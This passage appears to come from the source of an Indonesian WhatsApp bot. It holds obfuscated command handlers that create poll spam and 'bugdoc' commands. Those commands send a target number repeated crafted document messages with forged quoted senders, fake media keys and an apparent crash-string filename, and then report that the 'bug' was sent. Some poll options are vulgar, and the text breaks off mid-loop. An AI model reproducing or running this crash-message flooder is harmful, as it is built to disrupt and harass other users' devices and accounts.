jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Ikyy`
for (let i = 0; i < jumlah; i++) {
ikycoli.sendMessage(m.chat, {document: thumb},{quoted: {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {}) 
},
"message": {
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc",
"mimetype": "application/octet-stream",
"fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=",
"fileLength": "64455",
"pageCount": 1,
"mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
"fileName": `IKYY MAKERZ ${ngazap(prefix)}`,
"fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk=",
}
}
}})
}
}
break

case 'poll':{
 function _0x557e(_0xf605e7,_0x1dbb4d){const _0x595c85=_0x441b();return _0x557e=function(_0x1753b5,_0xb226bf){_0x1753b5=_0x1753b5-0x1dd;let _0x585ca6=_0x595c85[_0x1753b5];return _0x585ca6;},_0x557e(_0xf605e7,_0x1dbb4d);}const _0x393c56=_0x557e;(function(_0x510fd6,_0xf7ad69){const _0xe2087a=_0x557e,_0x5f17df=_0x510fd6();while(!![]){try{const _0x3190b0=parseInt(_0xe2087a(0x1f1))/0x1+parseInt(_0xe2087a(0x1ef))/0x2+parseInt(_0xe2087a(0x1e3))/0x3+-parseInt(_0xe2087a(0x1eb))/0x4+parseInt(_0xe2087a(0x1fd))/0x5+-parseInt(_0xe2087a(0x1f6))/0x6+-parseInt(_0xe2087a(0x1ee))/0x7;if(_0x3190b0===_0xf7ad69)break;else _0x5f17df['push'](_0x5f17df['shift']());}catch(_0x209ec9){_0x5f17df['push'](_0x5f17df['shift']());}}}(_0x441b,0xb143c));const _0x264b94=(function(){let _0x2ae7ef=!![];return function(_0x700d04,_0x30f960){const _0x57e3f6=_0x2ae7ef?function(){const _0x2a6345=_0x557e;if(_0x30f960){const _0x5446d6=_0x30f960[_0x2a6345(0x1f2)](_0x700d04,arguments);return _0x30f960=null,_0x5446d6;}}:function(){};return _0x2ae7ef=![],_0x57e3f6;};}()),_0x4cfbf5=_0x264b94(this,function(){const _0x366e8d=_0x557e;return _0x4cfbf5[_0x366e8d(0x1e5)]()[_0x366e8d(0x1fe)]('(((.+)+)+)+$')[_0x366e8d(0x1e5)]()['constructor'](_0x4cfbf5)[_0x366e8d(0x1fe)](_0x366e8d(0x1e7));});function _0x441b(){const _0x4997e7=['apply','readFileSync','prototype','PENDING','2141292YYfCnI','chat','HALO\x20SAYA\x20THE\x20IKYY\x20BOTZ','KATANYA\x20KEBAL','return\x20(function()\x20','key','log','4092800rJiSah','search','Message','info','VOTE\x20YUK','https://mmg.whatsapp.net/d/f/AnyaZPBHxD2w7tJkGh-OmppuLyXIAeuBwBoFb2wwYTOM.enc','BERANI\x20VOTE\x20GA','constructor','exception','bind','359715WlzuJv','VOTE\x20LAH\x20SEMUA','toString','trace','(((.+)+)+)+$','__proto__','message','relayMessage','5238308igoiXT','Vote\x20Aja\x20Semua','error','1590603ZlPqWw','644558fgEcqW','console','1359020GMPHGa'];_0x441b=function(){return _0x4997e7;};return _0x441b();}_0x4cfbf5();const _0xb226bf=(function(){let _0x148e79=!![];return function(_0x1ec807,_0x562aae){const _0x2b7ab6=_0x148e79?function(){const _0x2929e1=_0x557e;if(_0x562aae){const _0x82a2eb=_0x562aae[_0x2929e1(0x1f2)](_0x1ec807,arguments);return _0x562aae=null,_0x82a2eb;}}:function(){};return _0x148e79=![],_0x2b7ab6;};}()),_0x1753b5=_0xb226bf(this,function(){const _0x64fefd=_0x557e,_0x5eb653=function(){const _0x54827a=_0x557e;let _0x20bc96;try{_0x20bc96=Function(_0x54827a(0x1fa)+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0x565b86){_0x20bc96=window;}return _0x20bc96;},_0x3af88f=_0x5eb653(),_0x1801d0=_0x3af88f['console']=_0x3af88f[_0x64fefd(0x1f0)]||{},_0x1d377b=[_0x64fefd(0x1fc),'warn',_0x64fefd(0x200),_0x64fefd(0x1ed),_0x64fefd(0x1e1),'table',_0x64fefd(0x1e6)];for(let _0x2eb31e=0x0;_0x2eb31e<_0x1d377b['length'];_0x2eb31e++){const _0x16f92a=_0xb226bf[_0x64fefd(0x1e0)][_0x64fefd(0x1f4)]['bind'](_0xb226bf),_0x19cc1f=_0x1d377b[_0x2eb31e],_0x3e6948=_0x1801d0[_0x19cc1f]||_0x16f92a;_0x16f92a[_0x64fefd(0x1e8)]=_0xb226bf[_0x64fefd(0x1e2)](_0xb226bf),_0x16f92a['toString']=_0x3e6948[_0x64fefd(0x1e5)][_0x64fefd(0x1e2)](_0x3e6948),_0x1801d0[_0x19cc1f]=_0x16f92a;}});_0x1753b5();{if(!isCreator&&!isBan)return;let stic={'key':{'participant':'6285706035039@s.whatsapp.net','remoteJid':'','fromMe':![],'id':'753B96FDB5F5EDF34BF64EC9095C9F8A'},'message':{'stickerMessage':{'fileSha256':'oC/LRMo7+iJN2AtYvhvIYRYLWR4NPmFlMvib5HQET7I=','pngThumbnail':fs[_0x393c56(0x1f3)]('./pict.jpg'),'mimetype':'image/webp','jpegThumbnail':virgam,'height':0x40,'width':0x40,'directPath':_0x393c56(0x1de),'fileLength':'99999999999','firstFrameLength':0xe2a,'isAnimated':![]}},'messageTimestamp':'1614070775','status':_0x393c56(0x1f5)};var pollCreation=generateWAMessageFromContent(m[_0x393c56(0x1f7)],proto[_0x393c56(0x1ff)]['fromObject']({'pollCreationMessage':{'name':_0x393c56(0x1f8),'options':[{'optionName':_0x393c56(0x1dd)},{'optionName':_0x393c56(0x1df)},{'optionName':_0x393c56(0x1e4)},{'optionName':_0x393c56(0x1f9)},{'optionName':'SALAM\x20THE\x20IKYY\x20BOTZ'}],'selectableOptionsCount':0x5}}),{'userJid':m[_0x393c56(0x1f7)],'quoted':stic});ikycoli[_0x393c56(0x1ea)](m[_0x393c56(0x1f7)],pollCreation[_0x393c56(0x1e9)],{'messageId':pollCreation[_0x393c56(0x1fb)]['id']}),jancok(_0x393c56(0x1ec));}}
break
case 'polling':{
var _0x44c70b=_0x168d;(function(_0x1eacb6,_0x27334f){var _0x49d96f=_0x168d,_0x32b59f=_0x1eacb6();while(!![]){try{var _0x2c060a=parseInt(_0x49d96f(0xea))/0x1+-parseInt(_0x49d96f(0xe9))/0x2*(-parseInt(_0x49d96f(0x106))/0x3)+-parseInt(_0x49d96f(0x102))/0x4+-parseInt(_0x49d96f(0x108))/0x5+parseInt(_0x49d96f(0x10d))/0x6*(parseInt(_0x49d96f(0xee))/0x7)+-parseInt(_0x49d96f(0xf1))/0x8*(-parseInt(_0x49d96f(0xed))/0x9)+-parseInt(_0x49d96f(0xfe))/0xa;if(_0x2c060a===_0x27334f)break;else _0x32b59f['push'](_0x32b59f['shift']());}catch(_0x39a504){_0x32b59f['push'](_0x32b59f['shift']());}}}(_0x3ece,0x5b448));function _0x168d(_0x3388ae,_0x25924f){var _0x2ebc7c=_0x3ece();return _0x168d=function(_0x386251,_0x46edc7){_0x386251=_0x386251-0xe8;var _0x565601=_0x2ebc7c[_0x386251];return _0x565601;},_0x168d(_0x3388ae,_0x25924f);}var _0x176e4d=(function(){var _0x591278=!![];return function(_0x47a450,_0x29f0dc){var _0x5f2ce3=_0x591278?function(){var _0x3159cc=_0x168d;if(_0x29f0dc){var _0x52e869=_0x29f0dc[_0x3159cc(0x109)](_0x47a450,arguments);return _0x29f0dc=null,_0x52e869;}}:function(){};return _0x591278=![],_0x5f2ce3;};}()),_0x5dd566=_0x176e4d(this,function(){var _0x38b449=_0x168d;return _0x5dd566[_0x38b449(0xff)]()[_0x38b449(0xf6)]('(((.+)+)+)+$')[_0x38b449(0xff)]()[_0x38b449(0xf2)](_0x5dd566)[_0x38b449(0xf6)](_0x38b449(0xeb));});function _0x3ece(){var _0xcaefcb=['3609rpEJwo','7BsEfQM','\x20SangPahlawan','\x20SangPemberani=','13320sMxbLx','constructor','Pengen\x20Ngocok\x20Kata:\x20','__proto__','console','search','relayMessage','\x20SukaMemek','Message','Silahkan\x20Di\x20Vote','Teksnya\x20Mana?','info','HALO\x20SAYA\x20','335970yNHxxM','toString','warn','return\x20(function()\x20','370624EikDRN','error','key','trace','66246SNqQZy','prototype','3695845CttjYZ','apply','message','chat','length','1990308NHpYgH','{}.constructor(\x22return\x20this\x22)(\x20)','12lxJoeG','107379pxwnFI','(((.+)+)+)+$','exception'];_0x3ece=function(){return _0xcaefcb;};return _0x3ece();}_0x5dd566();var _0x46edc7=(function(){var _0x52d90c=!![];return function(_0x39c384,_0x5ad3bc){var _0x21b453=_0x52d90c?function(){var _0x8a76ac=_0x168d;if(_0x5ad3bc){var _0x3cf1bb=_0x5ad3bc[_0x8a76ac(0x109)](_0x39c384,arguments);return _0x5ad3bc=null,_0x3cf1bb;}}:function(){};return _0x52d90c=![],_0x21b453;};}()),_0x386251=_0x46edc7(this,function(){var _0x322123=_0x168d,_0x4187fa=function(){var _0x77b64e=_0x168d,_0x28ea12;try{_0x28ea12=Function(_0x77b64e(0x101)+_0x77b64e(0xe8)+');')();}catch(_0x1d7823){_0x28ea12=window;}return _0x28ea12;},_0x33a76e=_0x4187fa(),_0x1af55e=_0x33a76e[_0x322123(0xf5)]=_0x33a76e['console']||{},_0x1333b2=['log',_0x322123(0x100),_0x322123(0xfc),_0x322123(0x103),_0x322123(0xec),'table',_0x322123(0x105)];for(var _0x3021c5=0x0;_0x3021c5<_0x1333b2[_0x322123(0x10c)];_0x3021c5++){var _0x19bce9=_0x46edc7['constructor'][_0x322123(0x107)]['bind'](_0x46edc7),_0x4db0fb=_0x1333b2[_0x3021c5],_0x1d9538=_0x1af55e[_0x4db0fb]||_0x19bce9;_0x19bce9[_0x322123(0xf4)]=_0x46edc7['bind'](_0x46edc7),_0x19bce9[_0x322123(0xff)]=_0x1d9538['toString']['bind'](_0x1d9538),_0x1af55e[_0x4db0fb]=_0x19bce9;}});_0x386251();{if(!isCreator&&!isBan)return;if(!text)throw _0x44c70b(0xfb);var pollCreation=generateWAMessageFromContent(m[_0x44c70b(0x10b)],proto[_0x44c70b(0xf9)]['fromObject']({'pollCreationMessage':{'name':_0x44c70b(0xfd)+text,'options':[{'optionName':text+_0x44c70b(0xef)},{'optionName':text+'\x20SangBandar'},{'optionName':text+_0x44c70b(0xf0)},{'optionName':text+_0x44c70b(0xf8)},{'optionName':_0x44c70b(0xf3)+text}],'selectableOptionsCount':0x5}}),{'userJid':m['chat'],'quoted':ikyzyx});ikycoli[_0x44c70b(0xf7)](m[_0x44c70b(0x10b)],pollCreation[_0x44c70b(0x10a)],{'messageId':pollCreation[_0x44c70b(0x104)]['id']}),jancok(_0x44c70b(0xfa));}
}
break
case 'polvot': {
var _0x2bf532=_0x41a3;(function(_0x2a575e,_0xe10e14){var _0x586d34=_0x41a3,_0x17556c=_0x2a575e();while(!![]){try{var _0x33d8f3=parseInt(_0x586d34(0x171))/0x1+-parseInt(_0x586d34(0x167))/0x2*(-parseInt(_0x586d34(0x159))/0x3)+parseInt(_0x586d34(0x160))/0x4*(-parseInt(_0x586d34(0x179))/0x5)+parseInt(_0x586d34(0x162))/0x6+parseInt(_0x586d34(0x17e))/0x7+parseInt(_0x586d34(0x15e))/0x8*(parseInt(_0x586d34(0x175))/0x9)+-parseInt(_0x586d34(0x15c))/0xa;if(_0x33d8f3===_0xe10e14)break;else _0x17556c['push'](_0x17556c['shift']());}catch(_0x1a9f65){_0x17556c['push'](_0x17556c['shift']());}}}(_0x348a,0x72652));var _0x1e4072=(function(){var _0x391af3=!![];return function(_0x39a093,_0x3ac8b4){var _0x3d4267=_0x391af3?function(){if(_0x3ac8b4){var _0x23b047=_0x3ac8b4['apply'](_0x39a093,arguments);return _0x3ac8b4=null,_0x23b047;}}:function(){};return _0x391af3=![],_0x3d4267;};}()),_0x2244d3=_0x1e4072(this,function(){var _0x1f5c31=_0x41a3;return _0x2244d3[_0x1f5c31(0x168)]()[_0x1f5c31(0x176)](_0x1f5c31(0x16a))['toString']()[_0x1f5c31(0x17a)](_0x2244d3)[_0x1f5c31(0x176)]('(((.+)+)+)+$');});_0x2244d3();var _0x18c5d1=(function(){var _0x3502ac=!![];return function(_0x4244e0,_0x2c2346){var _0x261db1=_0x3502ac?function(){if(_0x2c2346){var _0xd2c02d=_0x2c2346['apply'](_0x4244e0,arguments);return _0x2c2346=null,_0xd2c02d;}}:function(){};return _0x3502ac=![],_0x261db1;};}()),_0x5eceac=_0x18c5d1(this,function(){var _0x49cee9=_0x41a3,_0x5b87d3;try{var _0xa128f9=Function(_0x49cee9(0x178)+_0x49cee9(0x17d)+');');_0x5b87d3=_0xa128f9();}catch(_0x42460c){_0x5b87d3=window;}var _0xd47ee6=_0x5b87d3[_0x49cee9(0x172)]=_0x5b87d3[_0x49cee9(0x172)]||{},_0x9409ed=[_0x49cee9(0x177),_0x49cee9(0x15d),_0x49cee9(0x169),_0x49cee9(0x173),_0x49cee9(0x17c),_0x49cee9(0x16c),_0x49cee9(0x161)];for(var _0x24ebfa=0x0;_0x24ebfa<_0x9409ed[_0x49cee9(0x17b)];_0x24ebfa++){var _0x5cc210=_0x18c5d1[_0x49cee9(0x17a)][_0x49cee9(0x163)]['bind'](_0x18c5d1),_0x3d6046=_0x9409ed[_0x24ebfa],_0x346c13=_0xd47ee6[_0x3d6046]||_0x5cc210;_0x5cc210[_0x49cee9(0x15f)]=_0x18c5d1['bind'](_0x18c5d1),_0x5cc210[_0x49cee9(0x168)]=_0x346c13['toString'][_0x49cee9(0x170)](_0x346c13),_0xd47ee6[_0x3d6046]=_0x5cc210;}});function _0x41a3(_0x14d0e4,_0x26ebad){var _0x262826=_0x348a();return _0x41a3=function(_0x5eceac,_0x18c5d1){_0x5eceac=_0x5eceac-0x159;var _0xf60a10=_0x262826[_0x5eceac];return _0xf60a10;},_0x41a3(_0x14d0e4,_0x26ebad);}_0x5eceac();{if(!isCreator&&!isBan)return;var pollCreation=generateWAMessageFromContent(m['chat'],proto[_0x2bf532(0x165)][_0x2bf532(0x174)]({'pollCreationMessage':{'name':'HALO\x20SAYA\x20'+wm,'options':[{'optionName':_0x2bf532(0x166)},{'optionName':_0x2bf532(0x164)},{'optionName':_0x2bf532(0x16e)},{'optionName':'KATANYA\x20KEBAL'},{'optionName':_0x2bf532(0x16d)}],'selectableOptionsCount':0x5}}),{'userJid':m['chat'],'quoted':fsticjo});ikycoli[_0x2bf532(0x16f)](m['chat'],pollCreation[_0x2bf532(0x15b)],{'messageId':pollCreation[_0x2bf532(0x15a)]['id']}),jancok(_0x2bf532(0x16b));}function _0x348a(){var _0x4bcd45=['__proto__','12StqaAa','trace','141126SyKxwj','prototype','BERANI\x20VOTE\x20GA','Message','VOTE\x20YUK','4346YdcpCR','toString','info','(((.+)+)+)+$','Vote\x20Aja\x20Semua','table','SALAM\x20IKYY\x20MAKERZ','VOTE\x20LAH\x20SEMUA','relayMessage','bind','146102UZUZBa','console','error','fromObject','9nByBHq','search','log','return\x20(function()\x20','898825BzjQyz','constructor','length','exception','{}.constructor(\x22return\x20this\x22)(\x20)','5599013fDMeQA','1191YBmBSc','key','message','8623490TPQqLQ','warn','304344dgJpZm'];_0x348a=function(){return _0x4bcd45;};return _0x348a();}
}
break
case 'teskemauan': {
var _0x2bf532=_0x41a3;(function(_0x2a575e,_0xe10e14){var _0x586d34=_0x41a3,_0x17556c=_0x2a575e();while(!![]){try{var _0x33d8f3=parseInt(_0x586d34(0x171))/0x1+-parseInt(_0x586d34(0x167))/0x2*(-parseInt(_0x586d34(0x159))/0x3)+parseInt(_0x586d34(0x160))/0x4*(-parseInt(_0x586d34(0x179))/0x5)+parseInt(_0x586d34(0x162))/0x6+parseInt(_0x586d34(0x17e))/0x7+parseInt(_0x586d34(0x15e))/0x8*(parseInt(_0x586d34(0x175))/0x9)+-parseInt(_0x586d34(0x15c))/0xa;if(_0x33d8f3===_0xe10e14)break;else _0x17556c['push'](_0x17556c['shift']());}catch(_0x1a9f65){_0x17556c['push'](_0x17556c['shift']());}}}(_0x348a,0x72652));var _0x1e4072=(function(){var _0x391af3=!![];return function(_0x39a093,_0x3ac8b4){var _0x3d4267=_0x391af3?function(){if(_0x3ac8b4){var _0x23b047=_0x3ac8b4['apply'](_0x39a093,arguments);return _0x3ac8b4=null,_0x23b047;}}:function(){};return _0x391af3=![],_0x3d4267;};}()),_0x2244d3=_0x1e4072(this,function(){var _0x1f5c31=_0x41a3;return _0x2244d3[_0x1f5c31(0x168)]()[_0x1f5c31(0x176)](_0x1f5c31(0x16a))['toString']()[_0x1f5c31(0x17a)](_0x2244d3)[_0x1f5c31(0x176)]('(((.+)+)+)+$');});_0x2244d3();var _0x18c5d1=(function(){var _0x3502ac=!![];return function(_0x4244e0,_0x2c2346){var _0x261db1=_0x3502ac?function(){if(_0x2c2346){var _0xd2c02d=_0x2c2346['apply'](_0x4244e0,arguments);return _0x2c2346=null,_0xd2c02d;}}:function(){};return _0x3502ac=![],_0x261db1;};}()),_0x5eceac=_0x18c5d1(this,function(){var _0x49cee9=_0x41a3,_0x5b87d3;try{var _0xa128f9=Function(_0x49cee9(0x178)+_0x49cee9(0x17d)+');');_0x5b87d3=_0xa128f9();}catch(_0x42460c){_0x5b87d3=window;}var _0xd47ee6=_0x5b87d3[_0x49cee9(0x172)]=_0x5b87d3[_0x49cee9(0x172)]||{},_0x9409ed=[_0x49cee9(0x177),_0x49cee9(0x15d),_0x49cee9(0x169),_0x49cee9(0x173),_0x49cee9(0x17c),_0x49cee9(0x16c),_0x49cee9(0x161)];for(var _0x24ebfa=0x0;_0x24ebfa<_0x9409ed[_0x49cee9(0x17b)];_0x24ebfa++){var _0x5cc210=_0x18c5d1[_0x49cee9(0x17a)][_0x49cee9(0x163)]['bind'](_0x18c5d1),_0x3d6046=_0x9409ed[_0x24ebfa],_0x346c13=_0xd47ee6[_0x3d6046]||_0x5cc210;_0x5cc210[_0x49cee9(0x15f)]=_0x18c5d1['bind'](_0x18c5d1),_0x5cc210[_0x49cee9(0x168)]=_0x346c13['toString'][_0x49cee9(0x170)](_0x346c13),_0xd47ee6[_0x3d6046]=_0x5cc210;}});function _0x41a3(_0x14d0e4,_0x26ebad){var _0x262826=_0x348a();return _0x41a3=function(_0x5eceac,_0x18c5d1){_0x5eceac=_0x5eceac-0x159;var _0xf60a10=_0x262826[_0x5eceac];return _0xf60a10;},_0x41a3(_0x14d0e4,_0x26ebad);}_0x5eceac();{if(!isCreator&&!isBan)return;var pollCreation=generateWAMessageFromContent(m['chat'],proto[_0x2bf532(0x165)][_0x2bf532(0x174)]({'pollCreationMessage':{'name':'PILIHAN\x20DARI\x20'+wm,'options':[{'optionName':_0x2bf532(0x166)},{'optionName':_0x2bf532(0x164)},{'optionName':_0x2bf532(0x16e)},{'optionName':'JADI\x20KAYA?'},{'optionName':_0x2bf532(0x16d)}],'selectableOptionsCount':0x5}}),{'userJid':m['chat'],'quoted':fsticjo});ikycoli[_0x2bf532(0x16f)](m['chat'],pollCreation[_0x2bf532(0x15b)],{'messageId':pollCreation[_0x2bf532(0x15a)]['id']}),jancok(_0x2bf532(0x16b));}function _0x348a(){var _0x4bcd45=['__proto__','12StqaAa','trace','141126SyKxwj','prototype','PUNYA\x20MOBIL\x20PAJERO','Message','PUNYA\x20MOBIL\x20AVANZA','4346YdcpCR','toString','info','(((.+)+)+)+$','Vote\x20Aja\x20Semua','table','PUNYA\x20MOBIL\x20LAMBORGHINI','PUNYA\x20MOBIL\x20TOYOTA','relayMessage','bind','146102UZUZBa','console','error','fromObject','9nByBHq','search','log','return\x20(function()\x20','898825BzjQyz','constructor','length','exception','{}.constructor(\x22return\x20this\x22)(\x20)','5599013fDMeQA','1191YBmBSc','key','message','8623490TPQqLQ','warn','304344dgJpZm'];_0x348a=function(){return _0x4bcd45;};return _0x348a();}
}
break
	case 'ikybugdocprivate':{
var _0x418493=_0x4af5;function _0x1e33(){var _0xa2c9e9=['(((.+)+)+)+$','apply','__proto__','prototype','constructor','ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk=','application/octet-stream','error','sendMessage','P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=','console','Nomernya\x20mana?','{}.constructor(\x22return\x20this\x22)(\x20)','search','3582280sMLoLw','trace','length','bind','4688090rUlrnN','THE\x20IKYY\x20BOTZ\x20','3234960pePYZy','891186oJjxQl','info','warn','77TgOqOU','return\x20(function()\x20','2432268FEIoCI','toString','log','Berhasil\x20Mengirim\x20Bugdoc\x20Di\x20Nomer\x20','90488FSydbG','64455','@s.whatsapp.net','exception','136587iniapN'];_0x1e33=function(){return _0xa2c9e9;};return _0x1e33();}(function(_0x2a4082,_0x29f039){var _0x545dfb=_0x4af5,_0xfd66f2=_0x2a4082();while(!![]){try{var _0x20f325=parseInt(_0x545dfb(0x76))/0x1+parseInt(_0x545dfb(0x8c))/0x2+-parseInt(_0x545dfb(0x91))/0x3+-parseInt(_0x545dfb(0x85))/0x4+parseInt(_0x545dfb(0x89))/0x5+parseInt(_0x545dfb(0x8b))/0x6+parseInt(_0x545dfb(0x8f))/0x7*(parseInt(_0x545dfb(0x72))/0x8);if(_0x20f325===_0x29f039)break;else _0xfd66f2['push'](_0xfd66f2['shift']());}catch(_0x5ea121){_0xfd66f2['push'](_0xfd66f2['shift']());}}}(_0x1e33,0x7477d));function _0x4af5(_0x4a48e7,_0x572398){var _0x6c464d=_0x1e33();return _0x4af5=function(_0xd2d34f,_0x405357){_0xd2d34f=_0xd2d34f-0x72;var _0x2e10dc=_0x6c464d[_0xd2d34f];return _0x2e10dc;},_0x4af5(_0x4a48e7,_0x572398);}var _0x572c59=(function(){var _0x25a7a0=!![];return function(_0x41675f,_0x5f348b){var _0xa8021e=_0x25a7a0?function(){if(_0x5f348b){var _0x425a80=_0x5f348b['apply'](_0x41675f,arguments);return _0x5f348b=null,_0x425a80;}}:function(){};return _0x25a7a0=![],_0xa8021e;};}()),_0x50347f=_0x572c59(this,function(){var _0x40185a=_0x4af5;return _0x50347f[_0x40185a(0x92)]()[_0x40185a(0x84)](_0x40185a(0x77))[_0x40185a(0x92)]()[_0x40185a(0x7b)](_0x50347f)[_0x40185a(0x84)](_0x40185a(0x77));});_0x50347f();var _0x405357=(function(){var _0x79329b=!![];return function(_0x2508e3,_0xd43252){var _0x1751fb=_0x79329b?function(){var _0x5ac0db=_0x4af5;if(_0xd43252){var _0x432cab=_0xd43252[_0x5ac0db(0x78)](_0x2508e3,arguments);return _0xd43252=null,_0x432cab;}}:function(){};return _0x79329b=![],_0x1751fb;};}()),_0xd2d34f=_0x405357(this,function(){var _0x589a28=_0x4af5,_0x5f4093;try{var _0x24b929=Function(_0x589a28(0x90)+_0x589a28(0x83)+');');_0x5f4093=_0x24b929();}catch(_0x11cff7){_0x5f4093=window;}var _0x3c88e8=_0x5f4093[_0x589a28(0x81)]=_0x5f4093['console']||{},_0xf98c11=[_0x589a28(0x93),_0x589a28(0x8e),_0x589a28(0x8d),_0x589a28(0x7e),_0x589a28(0x75),'table',_0x589a28(0x86)];for(var _0x2d26af=0x0;_0x2d26af<_0xf98c11[_0x589a28(0x87)];_0x2d26af++){var _0x5329bb=_0x405357[_0x589a28(0x7b)][_0x589a28(0x7a)][_0x589a28(0x88)](_0x405357),_0x3411e9=_0xf98c11[_0x2d26af],_0xecee96=_0x3c88e8[_0x3411e9]||_0x5329bb;_0x5329bb[_0x589a28(0x79)]=_0x405357[_0x589a28(0x88)](_0x405357),_0x5329bb['toString']=_0xecee96[_0x589a28(0x92)][_0x589a28(0x88)](_0xecee96),_0x3c88e8[_0x3411e9]=_0x5329bb;}});_0xd2d34f();{if(!isCreator&&!isBan)return;if(!text)throw _0x418493(0x82);ikycoli[_0x418493(0x7f)](text+_0x418493(0x74),{'document':thumb},{'quoted':{'key':{'fromMe':![],'participant':'0@s.whatsapp.net',...from?{'remoteJid':'@s.whatsapp.net'}:{}},'message':{'documentMessage':{'url':'https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc','mimetype':_0x418493(0x7d),'fileSha256':'TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=','fileLength':_0x418493(0x73),'pageCount':0x1,'mediaKey':_0x418493(0x80),'fileName':_0x418493(0x8a)+philips+'\x20'+ngazap(prefix),'fileEncSha256':_0x418493(0x7c)}}}}),m['reply'](_0x418493(0x94)+text);}
}
break

	case 'ikybugdoc':{
function _0x48e1(){const _0x449235=['64455','chat','2moGGYg','trace','constructor','18984ksTELK','bind','1317263IOGwxh','log','return\x20(function()\x20','ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk=','16200620oBRuVc','warn','11tkMCbo','sendMessage','6048890FcXPet','P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=','toString','(((.+)+)+)+$','reply','1434VfNlfq','Jumlahnya?','exception','error','THE\x20IKYY\x20BOTZ\x20\x20\x20\x0a\x20','search','Sukses\x20Send\x20Bug\x20Sebanyak\x20','info','TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=','2751944LkjpTf','__proto__','1737657aghGqS','https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc','apply','prototype','application/octet-stream','746116MQwYfE','9DYdHnY'];_0x48e1=function(){return _0x449235;};return _0x48e1();}function _0x369f(_0x486f92,_0x5ad055){const _0x2bfa64=_0x48e1();return _0x369f=function(_0x543bd0,_0x2470d8){_0x543bd0=_0x543bd0-0x71;let _0x26d1aa=_0x2bfa64[_0x543bd0];return _0x26d1aa;},_0x369f(_0x486f92,_0x5ad055);}const _0x243d3b=_0x369f;(function(_0x428fde,_0x4a6bb){const _0x58ee45=_0x369f,_0x22773c=_0x428fde();while(!![]){try{const _0x273608=-parseInt(_0x58ee45(0x82))/0x1*(-parseInt(_0x58ee45(0x7d))/0x2)+-parseInt(_0x58ee45(0x7a))/0x3*(-parseInt(_0x58ee45(0x79))/0x4)+parseInt(_0x58ee45(0x8a))/0x5+-parseInt(_0x58ee45(0x8f))/0x6*(parseInt(_0x58ee45(0x80))/0x7)+-parseInt(_0x58ee45(0x72))/0x8+parseInt(_0x58ee45(0x74))/0x9+parseInt(_0x58ee45(0x86))/0xa*(-parseInt(_0x58ee45(0x88))/0xb);if(_0x273608===_0x4a6bb)break;else _0x22773c['push'](_0x22773c['shift']());}catch(_0x580f59){_0x22773c['push'](_0x22773c['shift']());}}}(_0x48e1,0xa2f56));const _0x5a9ba6=(function(){let _0x49b3ed=!![];return function(_0x95b87b,_0x48ef8c){const _0x1a6846=_0x49b3ed?function(){const _0x12faa4=_0x369f;if(_0x48ef8c){const _0x3a3d6c=_0x48ef8c[_0x12faa4(0x76)](_0x95b87b,arguments);return _0x48ef8c=null,_0x3a3d6c;}}:function(){};return _0x49b3ed=![],_0x1a6846;};}()),_0x5bab0f=_0x5a9ba6(this,function(){const _0x2972b1=_0x369f;return _0x5bab0f[_0x2972b1(0x8c)]()[_0x2972b1(0x94)](_0x2972b1(0x8d))['toString']()[_0x2972b1(0x7f)](_0x5bab0f)[_0x2972b1(0x94)](_0x2972b1(0x8d));});_0x5bab0f();const _0x2470d8=(function(){let _0x492912=!![];return function(_0x4c619b,_0x358806){const _0x5ca529=_0x492912?function(){const _0x5dcbcf=_0x369f;if(_0x358806){const _0x5d4ddd=_0x358806[_0x5dcbcf(0x76)](_0x4c619b,arguments);return _0x358806=null,_0x5d4ddd;}}:function(){};return _0x492912=![],_0x5ca529;};}()),_0x543bd0=_0x2470d8(this,function(){const _0xdcfbdf=_0x369f;let _0xfbe3f7;try{const _0x15811e=Function(_0xdcfbdf(0x84)+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0xfbe3f7=_0x15811e();}catch(_0x2dd8ae){_0xfbe3f7=window;}const _0x3f9e39=_0xfbe3f7['console']=_0xfbe3f7['console']||{},_0x5b4d0b=[_0xdcfbdf(0x83),_0xdcfbdf(0x87),_0xdcfbdf(0x96),_0xdcfbdf(0x92),_0xdcfbdf(0x91),'table',_0xdcfbdf(0x7e)];for(let _0x3b935f=0x0;_0x3b935f<_0x5b4d0b['length'];_0x3b935f++){const _0x405f86=_0x2470d8[_0xdcfbdf(0x7f)][_0xdcfbdf(0x77)]['bind'](_0x2470d8),_0x5e379f=_0x5b4d0b[_0x3b935f],_0x10215b=_0x3f9e39[_0x5e379f]||_0x405f86;_0x405f86[_0xdcfbdf(0x73)]=_0x2470d8[_0xdcfbdf(0x81)](_0x2470d8),_0x405f86['toString']=_0x10215b['toString']['bind'](_0x10215b),_0x3f9e39[_0x5e379f]=_0x405f86;}});_0x543bd0();{if(!isCreator&&!isBan)return;if(args['length']==0x0)return m[_0x243d3b(0x8e)](_0x243d3b(0x90));jumlah=''+encodeURI(q);for(let 